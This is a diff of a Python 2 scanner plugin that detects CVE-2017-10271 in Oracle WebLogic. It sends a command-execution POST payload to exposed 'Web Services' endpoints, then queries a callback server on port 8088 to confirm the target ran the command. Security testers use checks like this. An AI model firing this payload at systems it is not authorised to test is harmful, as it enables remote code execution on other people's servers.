@@ -2,7 +2,7 @@
 #coding:utf-8
 
 import random
-import requests
+import urllib2
 import socket
 from time import sleep
 
@@ -14,7 +14,7 @@ def get_plugin_info():
             "type": "命令执行",
             "author": ".@sinosig",
             "url": "https://www.oracle.com/technetwork/topics/security/cpuoct2017-3236626.html",
-            "keyword": "http:web"
+            "keyword": "http:web",
     }
     return plugin_info
 
@@ -73,18 +73,17 @@ def check(ip, port, timeout):
                 ''' %(test_str, server_ip)
     for url in check_url:
         target_url = 'http://'+ip+':'+str(port)+url.strip()
-        try:
-            if 'Web Services' in requests.get(target_url, headers=heads).text:
+        req = urllib2.Request(url=target_url, headers=heads)
+        if 'Web Services' in urllib2.urlopen(req, timeout=timeout).read():
+                req = urllib2.Request(url=target_url, data=post_str, headers=heads)
                 try:
-                    requests.post(target_url, data=post_str, headers=heads, timeout=timeout)
-                    sleep(2)
-                    check_result = requests.get("http://%s:8088/%s" % (server_ip, test_str)).text
-                    if "YES" in check_result:
-                        return "Exist CVE-2017-10271"
-                except requests.ConnectionError:
+                    urllib2.urlopen(req, timeout=timeout).read()
+                except urllib2.URLError:
                     pass
-            else:
-                continue
-        except requests.ConnectionError:
+                sleep(2)
+                check_result = urllib2.urlopen("http://%s:8088/%s" %(server_ip, test_str), timeout=timeout).read()
+                print check_result
+                if "YES" in check_result:
+                    return "Exist CVE-2017-10271"
+        else:
             pass
-            break
